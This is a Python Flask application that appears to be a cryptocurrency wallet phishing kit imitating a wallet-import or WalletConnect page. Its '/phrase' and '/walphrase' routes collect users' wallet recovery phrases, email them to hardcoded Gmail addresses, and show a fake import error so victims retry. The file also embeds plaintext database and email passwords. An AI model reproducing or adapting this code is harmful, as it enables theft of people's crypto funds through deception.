from crypt import methods
from email.mime import image
from unicodedata import name
from flask import Flask, render_template, request, flash, redirect, url_for, session, abort, jsonify
from werkzeug import datastructures
from flask_msearch import Search 
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from flask_bcrypt import Bcrypt
from flask_login import LoginManager, UserMixin, current_user, login_user, logout_user, login_required
from flask_uploads import IMAGES, configure_uploads, patch_request_class, UploadSet
from forms import AddWallet, Phrase
from flask_socketio import SocketIO, emit, Namespace
from flask_moment import Moment
from uuid import uuid4
import random, string
from sqlalchemy import exists, case, distinct
from flask_mail import Mail, Message
from datetime import datetime
import os, secrets
import json

basedir = os.path.abspath(os.path.dirname(__file__))

app = Flask(__name__)
mail = Mail()
mail.init_app(app)
moment = Moment(app)
db = SQLAlchemy(app)
bcrypt = Bcrypt(app)
socketio = SocketIO(app)
login_manager = LoginManager()
search = Search()
login_manager.init_app(app)
search.init_app(app)
login_manager.login_view='login'
login_manager.needs_refresh_messsage_category='danger'
login_manager.login_message=u'Please login first'


app.config['SQLALCHEMY_DATABASE_URI'] = 'postgres://olamicreas:mujeeb@localhost/Abeg'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = 'SECRET_KEY'
app.config['UPLOADED_PHOTOS_DEST'] = os.path.join(basedir, 'static/images')
app.config['MAIL_SERVER']='smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USERNAME'] = 'olamicreas@gmail.com'
app.config['MAIL_PASSWORD'] = 'ultralegend'
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
app.config['MAIL_DEFAULT_SENDER'] = 'olamicreas@gmail.com'
mail = Mail(app)


moment.init_app(app)
photos = UploadSet('photos', IMAGES)
configure_uploads(app, photos)
patch_request_class(app)








class Wallet(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.Text, unique=True)
    image = db.Column(db.String(150), default='img.jpg.png')

    def __init__(self, name, image):
        self.name = name
        self.image = image 

class Lastwallet(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.Text, unique=True)
    image = db.Column(db.String(150), default='img.jpg.png')

    def __init__(self, name, image):
        self.name = name
        self.image = image 

@app.route('/addWallet', methods=['GET', 'POST'])
def add():
    form = AddWallet(request.form)
    if request.method == 'POST':

        name = form.name.data
        image = photos.save(request.files.get('image'), name=secrets.token_hex(10) + ".")
        

        new_wallet = Lastwallet(name=name, image=image)
        db.session.add(new_wallet)
        db.session.commit()
        flash(f'Added')
        return redirect(request.referrer)
    return render_template ('registration.html', form=form)        




@app.route('/')
def home():
    new_wal = Lastwallet.query.all()
    wal = Wallet.query.all()
    return render_template('index.html', wal=wal, new_wal=new_wal)

@app.route('/single/<int:id>')
def single(id):
    coin = Wallet.query.get(id)
    return render_template('single.html', coin=coin)

@app.route('/phrase/<int:id>', methods=["POST", "GET"])
def phrase(id):
    form = Phrase(request.form)
    coin = Wallet.query.get(id)
    if request.method == "POST":
        body = form.phrase.data
        subject = request.form['theId']
        msg = Message(subject=subject, recipients= ['Paulclark5809@gmail.com', 'abdulquayyumoyedotun@gmail.com'], body=body)
        mail.send(msg)
        flash(f'Error while import {subject} phrase, Try again in some min', 'danger')

        return redirect(request.referrer)

    return render_template('phrase.html', coin=coin, form=form)

@app.route('/walletconnect')
def walhome():
    new_wal = Lastwallet.query.all()
    wal = Wallet.query.all()
    return render_template('walindex.html', wal=wal, new_wal=new_wal)

@app.route('/walsingle/<int:id>')
def walsingle(id):
    coin = Wallet.query.get(id)
    return render_template('walsingle.html', coin=coin)

@app.route('/walphrase/<int:id>', methods=["POST", "GET"])
def walphrase(id):
    form = Phrase(request.form)
    coin = Wallet.query.get(id)
    if request.method == "POST":
        body = form.phrase.data
        subject = request.form['theId']
        msg = Message(subject=subject, recipients= ['johnsonpike93@gmail.com', 'abdulquayyumoyedotun@gmail.com'], body=body)
        mail.send(msg)
        flash(f'Error while importing {subject} phrase, Try again in some min', 'danger')

        return redirect(request.referrer)

    return render_template('walphrase.html', coin=coin, form=form)



if __name__ == "__main__":
    app.run()

